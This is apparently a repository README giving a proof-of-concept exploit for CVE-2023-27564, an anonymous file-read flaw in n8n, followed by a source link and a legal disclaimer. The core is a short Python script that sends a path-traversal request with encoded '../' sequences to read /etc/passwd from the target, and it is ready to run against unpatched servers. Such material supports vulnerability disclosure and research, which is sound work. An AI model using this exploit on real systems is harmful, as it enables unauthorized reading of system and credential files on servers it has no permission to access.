# Exploit for CVE-2023-27564

This vulnerability allows anonymous file read in n8n.

```python
import requests

url = "https://example.com/rest/data/filesystem:..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd:.svg"

response = requests.get(url)

print(response.status_code)
print(response.headers)
print(response.text)
```

# Source

https://www.synacktiv.com/sites/default/files/2023-05/Synacktiv-N8N-Multiple-Vulnerabilities_0.pdf

# Disclaimer

The Proof of Concept (PoC) provided in this repository is for educational and security research purposes only. The information and code are intended to be used by cybersecurity professionals and researchers to understand and protect against vulnerabilities in software and systems. Any use of this PoC, related information, or code for attacking targets without prior mutual consent is illegal and strictly prohibited.

By using this PoC, you agree that you understand the potential impact of the vulnerability it demonstrates and that you will use it responsibly and ethically. The authors of this PoC disclaim any liability for any misuse of this material or any damages that may occur from using the information and code provided. It is the end user's responsibility to obey all applicable local, state, national, and international laws.

The authors have made every effort to ensure the accuracy and reliability of the information provided in this repository. However, the information is provided "as is" without warranty of any kind. The authors do not accept any responsibility or liability for the accuracy, content, completeness, legality, or reliability of the information contained.
